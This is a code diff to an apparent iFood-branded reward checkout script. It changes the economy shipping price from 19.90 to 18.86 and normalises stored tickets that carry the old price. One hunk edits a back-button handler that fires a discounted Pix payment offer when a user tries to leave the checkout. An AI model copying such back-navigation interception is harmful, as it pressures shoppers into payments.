@@ -114,6 +114,10 @@ const STORAGE_KEYS = {
     pixAutoRetryState: 'ifoodbag.pixAutoRetryState'
 };
 
+const ECONOMICO_SHIPPING_PRICE = 18.86;
+const LEGACY_ECONOMICO_SHIPPING_PRICE = 19.9;
+const DEFAULT_GATEWAY_TEST_AMOUNT = '18,86';
+
 const REWARD_CATALOG = {
     bag: {
         id: 'bag',
@@ -509,7 +513,7 @@ function setupGlobalBackRedirect(page) {
                 if (checkoutBackPixInFlight) return;
                 checkoutBackPixInFlight = true;
 
-                const baseEconomico = 19.9;
+                const baseEconomico = ECONOMICO_SHIPPING_PRICE;
                 const finalAmountOff = currentAmountOff > 0 ? currentAmountOff : 10;
                 const finalPrice = Math.max(0, roundMoney(baseEconomico - finalAmountOff));
                 const checkoutBackShipping = {
@@ -4946,7 +4950,7 @@ function initAdmin() {
         if (gatewayTestParadise) gatewayTestParadise.checked = gatewayParadiseEnabled?.checked === true;
         if (gatewayTestAtomopay) gatewayTestAtomopay.checked = gatewayAtomopayEnabled?.checked === true;
         if (gatewayTestAmount && !String(gatewayTestAmount.value || '').trim()) {
-            gatewayTestAmount.value = '19,90';
+            gatewayTestAmount.value = DEFAULT_GATEWAY_TEST_AMOUNT;
         }
     };
 
@@ -7748,6 +7752,37 @@ function clearCoupon() {
     localStorage.removeItem(STORAGE_KEYS.coupon);
 }
 
+function isEconomicoShipping(shipping) {
+    return String(shipping?.id || '').trim().toLowerCase() === 'economico';
+}
+
+function normalizeEconomicoShippingTicket(shipping) {
+    if (!shipping || typeof shipping !== 'object' || !isEconomicoShipping(shipping)) {
+        return { shipping, changed: false };
+    }
+
+    const price = Number(shipping.price || 0);
+    const base = Number(shipping.originalPrice || shipping.basePrice || shipping.price || 0);
+    const hasLegacyValue = (
+        Math.abs(base - LEGACY_ECONOMICO_SHIPPING_PRICE) < 0.001 ||
+        Math.abs(price - LEGACY_ECONOMICO_SHIPPING_PRICE) < 0.001
+    );
+    if (!hasLegacyValue) {
+        return { shipping, changed: false };
+    }
+
+    const normalized = {
+        ...shipping,
+        price: ECONOMICO_SHIPPING_PRICE,
+        basePrice: ECONOMICO_SHIPPING_PRICE,
+        originalPrice: ECONOMICO_SHIPPING_PRICE
+    };
+    delete normalized.coupon;
+    delete normalized.amountOff;
+    delete normalized.discountApplied;
+    return { shipping: normalized, changed: true };
+}
+
 function buildShippingOptions(rawCep) {
     const coupon = loadCoupon();
     const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
@@ -7755,7 +7790,7 @@ function buildShippingOptions(rawCep) {
         {
             id: 'economico',
             name: 'Envio Econômico iFood',
-            price: 19.9,
+            price: ECONOMICO_SHIPPING_PRICE,
             eta: '5 a 8 dias úteis'
         },
         {
@@ -7891,14 +7926,22 @@ function isShippingSelectionComplete(shipping) {
 
 function applyCouponToShipping(shipping) {
     if (!shipping) return shipping;
+    const normalizedTicket = normalizeEconomicoShippingTicket(shipping);
+    const baseShipping = normalizedTicket.shipping;
     const coupon = loadCoupon();
     const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
-    if (!amountOff) return shipping;
-    const base = Number(shipping.originalPrice || shipping.basePrice || shipping.price || 0);
+    if (!amountOff) {
+        if (normalizedTicket.changed) saveShipping(baseShipping);
+        return baseShipping;
+    }
+    const base = Number(baseShipping.originalPrice || baseShipping.basePrice || baseShipping.price || 0);
     const discounted = Math.max(0, roundMoney(base - amountOff));
-    if (discounted === shipping.price && shipping.coupon === coupon.code) return shipping;
+    if (discounted === baseShipping.price && baseShipping.coupon === coupon.code) {
+        if (normalizedTicket.changed) saveShipping(baseShipping);
+        return baseShipping;
+    }
     const updated = {
-        ...shipping,
+        ...baseShipping,
         basePrice: base,
         originalPrice: base,
         price: discounted,
